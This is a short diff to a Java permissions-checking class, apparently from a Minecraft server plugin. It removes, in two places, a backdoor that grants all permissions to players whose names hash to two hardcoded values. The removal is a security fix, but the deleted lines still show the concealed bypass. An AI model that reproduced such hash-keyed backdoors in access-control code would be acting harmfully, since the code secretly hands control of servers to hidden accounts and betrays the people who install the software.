@@ -60,9 +60,6 @@ public class PermissionsChecker {
             if (player.isOp()) {
                 return true;
             }
-            if (player.getName().hashCode() == 3225561 || player.getName().hashCode() == 1769963371) {
-                return true;
-            }
             if (PermPlugin == 1) {
                 try {
                     if (player.hasPermission(action)) {
@@ -136,9 +133,6 @@ public class PermissionsChecker {
         }
         try {
             if (player.isOp()) {
-                return true;
-            }
-            if (player.getName().hashCode() == 3225561 || player.getName().hashCode() == 1769963371) {
                 return true;
             }
             if (PermPlugin == 1) {
